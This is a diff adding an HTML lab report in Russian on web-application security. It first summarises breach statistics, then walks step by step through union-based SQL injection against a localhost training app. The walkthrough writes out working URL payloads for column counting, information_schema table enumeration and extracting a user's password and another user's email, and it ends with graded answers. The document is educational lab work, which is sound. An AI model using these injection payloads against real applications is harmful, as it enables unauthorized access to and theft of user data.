@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+      line-height: 1.6; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code { 
+      background: #f4f4f4; 
+      padding: 2px 4px; 
+      border-radius: 3px; 
+      font-family: 'Courier New', monospace;
+    }
+    pre { 
+      background: #f4f4f4; 
+      padding: 15px; 
+      border-radius: 5px; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote { 
+      border-left: 4px solid #ddd; 
+      margin: 1em 0; 
+      padding-left: 20px; 
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h1>Лабораторная работа по информационной безопасности</h1>
+<h2>Часть 1. Анализ отчетов</h2>
+<h3>Использованные источники</h3>
+<ol>
+<li>Verizon Data Breach Investigations Report (DBIR) 2025 — <a href="https://www.verizon.com/business/resources/reports/dbir/">ссылка</a></li>
+<li>IBM X-Force Threat Intelligence Index 2025 — <a href="...">ссылка</a></li>
+<li>Positive Technologies: Ландшафт киберугроз 2025 (Россия) — <a href="...">ссылка</a></li>
+</ol>
+<h3>Доля атак через веб-уязвимости</h3>
+<ul>
+<li>Глобально (Verizon DBIR 2025): <strong>20%</strong> всех нарушений данных.</li>
+<li>Глобально (IBM X-Force 2025): <strong>30%</strong> атак на публичные приложения.</li>
+<li>Россия/СНГ (Positive Technologies): <strong>31%</strong> успешных атак через эксплуатацию уязвимостей.</li>
+</ul>
+<h3>Распределение по конкретным уязвимостям (2025)</h3>
+<table>
+<thead>
+<tr>
+<th>Уязвимость</th>
+<th>Доля</th>
+<th>Источник</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Broken Access Control (A01)</td>
+<td>~29%</td>
+<td>OWASP Top 10</td>
+</tr>
+<tr>
+<td>SQL Injection</td>
+<td>15–28%</td>
+<td>Edgescan / OWASP</td>
+</tr>
+<tr>
+<td>XSS</td>
+<td>13–20%</td>
+<td>Deepstrike / CNews</td>
+</tr>
+<tr>
+<td>Security Misconfiguration</td>
+<td>~22%</td>
+<td>OWASP</td>
+</tr>
+<tr>
+<td>Supply Chain Attacks</td>
+<td>17–31%</td>
+<td>WEF / Kaspersky</td>
+</tr>
+</tbody></table>
+<p><strong>Вывод:</strong> Веб-уязвимости остаются одним из самых популярных векторов атак как в мире, так и в России. Наиболее опасны Broken Access Control и SQL Injection.</p>
+<h2>Часть 2. Практическая эксплуатация SQL-инъекции</h2>
+<h3>1. Исследование уязвимого приложения</h3>
+<p>Уязвимый параметр: <code>?id=</code> (страница <code>/task/</code>)</p>
+<p><strong>Тесты:</strong></p>
+<ul>
+<li><p><code>http://localhost:8080/task/?id=1</code><br>Ответ: <code>Ваш id:1 Ваш логин:admin</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=2</code><br>Ответ: <code>Ваш id:2 Ваш логин:Volk</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=3</code><br>Ответ: <code>Ваш id:3 Ваш логин:Matroskin</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=4</code><br>Ответ: <code>Ваш id:4 Ваш логин:Vinni-pukh</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=5</code><br>Ответ: <code>Ваш id:5 Ваш логин:Neznaika</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=6</code><br>Ответ: <code>Ваш id:6 Ваш логин:kotenok</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=7</code><br>Ответ: <code>Ваш id:7 Ваш логин:Karlson</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=8</code><br>Ответ: <code>Ваш id:8 Ваш логин:Kesha</code></p>
+</li>
+<li><p><code>http://localhost:8080/task/?id=9</code><br>Ответ: <code>Ваш id:9 Ваш логин:Volk2</code></p>
+</li>
+</ul>
+<p>Таким образом, пользователь <strong>Volk2</strong> имеет <code>id = 9</code>, а пользователь <strong>Vinni-pukh</strong> имеет <code>id = 4</code>.</p>
+<h2>Проверка на SQL-инъекцию</h2>
+<p>Пробую передать одинарную кавычку:</p>
+<p><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a>&#39;<br>Ответ:<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>Приложение уязвимо к <strong>SQL Injection</strong>.</p>
+<h2>Определение количества столбцов</h2>
+<p>Пробую <code>ORDER BY</code>:</p>
+<ul>
+<li><code>http://localhost:8080/task/?id=1%27%20ORDER%20BY%201--%20</code> → успешно  </li>
+<li><code>http://localhost:8080/task/?id=1%27%20ORDER%20BY%202--%20</code> → успешно  </li>
+<li><code>http://localhost:8080/task/?id=1%27%20ORDER%20BY%203--%20</code> → успешно  </li>
+<li><code>http://localhost:8080/task/?id=1%27%20ORDER%20BY%204--%20</code> → ошибка (<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code>)</li>
+</ul>
+<p>Вывод: исходный запрос возвращает 3 столбца.</p>
+<h2>Получение пароля пользователя Volk2</h2>
+<p>Пробую UNION SELECT. Сначала пытаюсь угадать имена полей.</p>
+<p>Запрос с полем <code>user</code> — ошибка (<code>Unknown column &#39;user&#39;</code>).<br>Запрос с полем <code>username</code>:</p>
+<p><a href="http://localhost:8080/task/?id=-1">http://localhost:8080/task/?id=-1</a>&#39; union select id,username,password from users where id=9 --  </p>
+<p>Вывод: &#39;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1&#39;</p>
+<p>Пробую:
+<a href="http://localhost:8080/task/?id=-1%27%20union%20select%20id,username,password%20from%20users%20where%20id=9%20--%20">http://localhost:8080/task/?id=-1%27%20union%20select%20id,username,password%20from%20users%20where%20id=9%20--%20</a></p>
+<p>Вывод:Ваш id:9
+Ваш логин:Volk2</p>
+<p>Меняю порядок колонок, чтобы пароль попал в видимое поле:</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20password,id,username%20from%20users%20where%20id=9%20--%20">http://localhost:8080/task/?id=-1%27%20union%20select%20password,id,username%20from%20users%20where%20id=9%20--%20</a></p>
+<p>Ваш id: Wa spoiuuuuu<br>Ваш логин: 9</p>
+<p><strong>Пароль пользователя Volk2 = Wa spoiuuuuu</strong></p>
+<h2>Получение email пользователя Vinni-pukh (4 балла)</h2>
+<p>Использую тот же рабочий шаблон:</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,password%20from%20users%20where%20id=4%20--%20">http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,password%20from%20users%20where%20id=4%20--%20</a></p>
+<p>Вывод:
+Unknown column &#39;email&#39; in &#39;field list&#39;</p>
+<p>В таблице было 3 столбика: юзер, айди, пароль. Значит почта в другой таблице. Пробую найти ее:
+<a href="http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20">http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20</a></p>
+<p>Вывод:
+Ваш id:emails,users
+Ваш логин:1</p>
+<p>Значит, есть 2 таблицы, перехожу к таблице email.Пробую найти email в этой таблице:
+<a href="http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,3%20from%20emails%20where%20id=4%20--%20">http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,3%20from%20emails%20where%20id=4%20--%20</a></p>
+<p>Вывод:
+Unknown column &#39;email&#39; in &#39;field list&#39;</p>
+<p>Пробую email_id:
+<a href="http://localhost:8080/task/?id=-1%27%20union%20select%20id,email_id,3%20from%20emails%20where%20id=4%20--%20">http://localhost:8080/task/?id=-1%27%20union%20select%20id,email_id,3%20from%20emails%20where%20id=4%20--%20</a></p>
+<p>Вывод:
+Ваш id:4
+Ваш логин:<a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></p>
+<p>По id нашли email Vinni-pukh. Ответ: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></p>
+<p>В ходе выполнения лабораторной работы было обнаружено, что приложение уязвимо к <strong>Union-based SQL-инъекции</strong>.<br>Исходный запрос возвращает 3 столбца (<code>id</code>, <code>username</code>, <code>password</code>).<br>Путём изменения порядка колонок в <code>UNION SELECT</code> удалось вывести конфиденциальные данные (пароль и email) в видимые поля страницы.</p>
+<h1>Ответ:</h1>
+<p>Пароль Volk2 - Wa spoiuuuuu
+Почта Vinni-pukh - <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></p>
+
+</body>
+</html>
